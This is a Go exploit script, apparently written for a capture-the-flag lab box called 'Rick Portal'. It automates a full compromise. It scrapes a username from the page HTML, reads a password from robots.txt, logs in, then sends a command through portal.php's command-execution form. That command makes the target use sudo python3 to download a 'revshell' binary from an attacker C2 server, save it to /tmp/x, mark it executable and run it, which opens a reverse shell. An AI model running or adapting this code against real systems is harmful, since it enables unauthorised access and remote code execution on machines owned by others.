package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"regexp"
	"strings"
	"time"
)

var ANSI_CLRLN string = "\r\x1b[2K\r"
var ANSI_CLRSC string = "\x1b[2J\x1b[H"
var ANSI_RST string = "\x1b[0m"
var ANSI_RED string = "\x1b[31;1m"
var ANSI_GRN string = "\x1b[32;1m"
var ANSI_YLW string = "\x1b[33;1m"
var ANSI_BLU string = "\x1b[34;1m"

type Client struct {
	baseURL string
	C2IP    string
	C2Port  int
	Route   string
	Session *http.Client
}

type CookieJar struct {
	jar map[string][]*http.Cookie
}

func SucMsg(msg string) {
	fmt.Printf("%s[%s+%s] %s\n", ANSI_CLRLN, ANSI_GRN, ANSI_RST, msg)
	return
}

func ErrMsg(msg string) {
	fmt.Printf("%s[%s-%s] %s\n", ANSI_CLRLN, ANSI_RED, ANSI_RST, msg)
	return
}

func InfMsg(msg string) {
	fmt.Printf("%s[%si%s] %s\n", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func InfMsgNB(msg string) {
	fmt.Printf("%s[%si%s] %s", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func SysMsg(msg string) {
	fmt.Printf("%s[%s*%s] %s\n", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func SysMsgNB(msg string) {
	fmt.Printf("%s[%s*%s] %s", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

//============================================================
//
// Function Name:
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to build a reverse shell command that
//  will be sent to the target in order to gain a foothold.
//
// Input(s):
//
//  None.
//
// Return(s):
//
//  shellcommand - string. command to open up reverse shell.
//  success - bool. indication of success.
//  message - string. status message.
//
//============================================================
func (c *Client) buildReverseShell() (shellcommand string, success bool, message string) {
	c2baseURL := fmt.Sprintf("http://%s:%d", c.C2IP, c.C2Port)
	shellFile := "revshell"
	downloadURL := fmt.Sprintf("%s/%s", c2baseURL, shellFile)

	pyimports := "import requests;import os"
	pysave := "f=open('/tmp/x','wb');f.write(r.content);f.close()"
	pyexec := "os.system('chmod +x /tmp/x;/tmp/x')"

	shellcommand = fmt.Sprintf("sudo python3 -c \"%s;r=requests.get('%s');%s;%s\"", pyimports, downloadURL, pysave, pyexec)
	return shellcommand, true, "reverse shell generated"
}

//============================================================
//
// Function Name:
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to confirm that the current session has
//  access to the portal page.
//
// Input(s):
//
//  None.
//
// Return(s):
//
//  success - bool. indication of success.
//  message - string. status message.
//
//============================================================
func (c *Client) ConfirmPortalAccess() (success bool, message string) {
	var bodyContent []byte
	var tgtpattern string = "<a.*Rick Portal</a>"

	SysMsgNB("confirming access to portal")
	bodyContent, success, message = c.GetBodyData("portal.php")
	if !success {
		return false, message
	}

	_, success, message = FindMatch(bodyContent, tgtpattern)
	if !success {
		return false, "unable to confirm portal access"
	}

	return true, "portal access confirmed"
}

//============================================================
//
// Function Name: GetBodyData
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to pull down the source HTML of a
//  designated route.
//
// Input(s):
//
//  route - string. route to pull down body content from.
//
// Return(s):
//
//  bodycontent - []byte. body data pulled down from site.
//  success - bool. indication of success.
//  message - string. status message.
//
//============================================================
func (c *Client) GetBodyData(route string) (bodycontent []byte, success bool, message string) {

	resp, err := c.Session.Get(fmt.Sprintf("%s/%s", c.baseURL, route))
	if err != nil {
		return nil, false, err.Error()
	}
	defer resp.Body.Close()

	bodycontent, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, false, err.Error()
	}

	return bodycontent, true, "body content successfully pulled"
}

//============================================================
//
// Function Name: GrabRobots
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to pull the password from robots.txt.
//
// Input(s):
//
//  None.
//
// Return(s):
//
//  password - string. password discovered in robots file.
//  success - bool. indication of success.
//  message - string. status message.
//
//============================================================
func (c *Client) GrabRobots() (password string, success bool, message string) {
	var targetURL string

	c.Route = "robots.txt"
	targetURL = fmt.Sprintf("%s/%s", c.baseURL, c.Route)

	SysMsgNB(fmt.Sprintf("pulling down %s", c.Route))
	resp, err := c.Session.Get(targetURL)
	if err != nil {
		return "", false, err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return "", false, fmt.Sprintf("Bad Status Code (%s)", resp.Status)
	}

	SysMsgNB(fmt.Sprintf("reading %s", c.Route))
	bodyContent, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", false, err.Error()
	}

	SysMsgNB(fmt.Sprintf("saving %s to local file", c.Route))
	fptr, err := os.Create(c.Route)
	if err != nil {
		return "", false, err.Error()
	}
	defer fptr.Close()

	_, err = fptr.Write(bodyContent)
	if err != nil {
		return "", false, err.Error()
	}

	password = strings.Replace(string(bodyContent), "\n", "", -1)

	return password, true, fmt.Sprintf("password found: \"%s\"", password)
}

//============================================================
//
// Function Name: GrabUsername
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to grab the username from the main
//  page's HTML source.
//
// Input(s):
//
//  None.
//
// Return(s):
//
//  username - string. username discovered in source.
//  success - bool. indication of success.
//  message - string. status message.
//
//============================================================
func (c *Client) GrabUsername() (username string, success bool, message string) {
	var bodycontent []byte
	var match string
	var unamepat string = "Username: [a-zA-Z0-9]+"

	SysMsgNB("looking for username ...")
	bodycontent, success, message = c.GetBodyData("/")
	if !success {
		return "", false, message
	}

	match, success, message = FindMatch(bodycontent, unamepat)
	if !success {
		return "", false, "no username discovered"
	}

	username = strings.Split(match, ": ")[1]
	if len(username) < 1 {
		return "", false, "username parsing failed"
	}

	return username, true, fmt.Sprintf("username found: \"%s\"", username)
}

//============================================================
//
// Function Name: Login
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to attempt login to the target site.
//
// Input(s):
//
//  username - string. username to attempt login with.
//  password - string. password to attempt login with.
//
// Return(s):
//
//  success - bool. indication of success.
//  message - string. status message.
//
//============================================================
func (c *Client) Login(username string, password string) (success bool, message string) {
	var tgtpattern string = "<h3>Portal Login Page</h3>"

	formData := url.Values{}
	formData.Set("username", username)
	formData.Set("password", password)
	formData.Set("sub", "Login")

	SysMsgNB(fmt.Sprintf("attempting login using \"%s:%s\"", username, password))

	resp, err := c.Session.PostForm(fmt.Sprintf("%s/login.php", c.baseURL), formData)
	if err != nil {
		return false, err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		return false, fmt.Sprintf("Bad Status Code (%s)", resp.Status)
	}

	re, err := regexp.Compile(tgtpattern)
	if err != nil {
		return false, err.Error()
	}

	bodyContent, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false, err.Error()
	}

	matches := re.FindAll(bodyContent, -1)
	if len(matches) > 0 {
		return false, "login unsuccessful"
	}

	cookieURL, err := url.Parse(c.baseURL)
	if err != nil {
		return false, err.Error()
	}
	c.Session.Jar.SetCookies(cookieURL, resp.Cookies())

	success, message = c.ConfirmPortalAccess()
	if !success {
		return success, message
	}

	return true, "login successful"
}

//============================================================
//
// Function Name: RunCommand
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to reach out to the target and execute
//  commands on the portal page.
//
// Input(s):
//
//  command - string. command to execute.
//
// Return(s):
//
//  success - bool. indication of success.
//  message - string. status message.
//
//============================================================
func (c *Client) RunCommand(command string) (success bool, message string) {
	var formData url.Values = url.Values{}
	var targetURL string

	c.Route = "portal.php"

	targetURL = fmt.Sprintf("%s/%s", c.baseURL, c.Route)

	formData.Set("command", command)
	formData.Set("sub", "Execute")

	SysMsgNB("executing remote command ...")
	resp, err := c.Session.PostForm(targetURL, formData)
	if err != nil {
		if e, ok := err.(net.Error); ok && e.Timeout() {
			return true, "timeout encountered. shell appears to be running."
		}
		return false, err.Error()
	}
	defer resp.Body.Close()

	return true, "command executed"
}

//============================================================
//
// Function Name: FindMatch
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to take a byte slice, search the slice
//  for a given regular expression pattern, and return the
//  first match of that pattern.
//
// Input(s):
//
//  bodycontent - []byte. byte slice to search for pattern.
//  tgtpattern - string. regex pattern to search for.
//
// Return(s):
//
//  match - string. first match of pattern discovered.
//  success - bool. indication of success.
//  message - string. status message.
//
//============================================================
func FindMatch(bodycontent []byte, tgtpattern string) (match string, success bool, message string) {

	re, err := regexp.Compile(tgtpattern)
	if err != nil {
		return "", false, err.Error()
	}

	matches := re.FindAll(bodycontent, -1)

	if len(matches) < 1 {
		return "", false, "no match found"
	}

	match = string(matches[0])

	return match, true, "match found"
}

func main() {
	var targetIP string
	var sessionjar *cookiejar.Jar
	var client *Client = &Client{Session: &http.Client{Timeout: 10 * time.Second}}

	flag.StringVar(&targetIP, "i", "127.0.0.1", "IP address of target (with port)")
	flag.StringVar(&client.C2IP, "c", "127.0.0.1", "IP address of C2 server")
	flag.IntVar(&client.C2Port, "p", 9999, "C2 server communication port")
	flag.Parse()

	sessionjar, err := cookiejar.New(nil)
	if err != nil {
		ErrMsg(err.Error())
		os.Exit(1)
	}

	client.baseURL = fmt.Sprintf("http://%s", targetIP)
	client.Session.Jar = sessionjar

	InfMsg(fmt.Sprintf("Base URL: %s", client.baseURL))

	username, success, message := client.GrabUsername()
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	password, success, message := client.GrabRobots()
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	success, message = client.Login(username, password)
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	tgtcommand, success, message := client.buildReverseShell()
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	success, message = client.RunCommand(tgtcommand)
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	return
}

